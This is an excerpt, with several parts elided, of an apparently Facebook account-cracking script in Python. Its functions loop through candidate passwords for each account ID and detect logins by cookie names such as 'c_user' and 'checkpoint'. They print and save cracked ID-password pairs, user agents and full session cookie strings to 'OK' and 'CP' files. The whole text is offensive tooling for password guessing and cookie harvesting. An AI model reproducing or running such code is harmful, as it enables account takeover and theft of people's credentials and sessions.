    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\33[91m[ZEE_CP] {idf}|{pw}')
                ...
                print(f'\r\33[92m[ZEE-OK] {idf}|{pw} | {kuki}')
    ...
    for pw in pwv:
        try:
            ...
            if 'c_user' in ses.cookies.get_dict():
                ...
                coki=ses.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\33[92m[ZEE_OK] {idf}|{pw} | {kuki}')
                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
                break
            else:
                continue
...
def crack2(idf,pwv,nmf):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r {P}[ZEE] {loop}|{len(id)} [OK:-{ok}]  | {U}{'{:.0%}'.format(loop/float(len(id)))}{P} "),
    sys.stdout.flush()
    for pw in pwv:
        try:
...
def crack3(idf,pwv,nmf):
    ...
    for pw in pwv:
        try:
            ...
            if 'c_user' in ses.cookies.get_dict():
                print(f'\r\33[91m[ZEE-CP] {idf}|{pw}')
                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                akun.append(idf+'|'+pw)
                cp+=1
                break
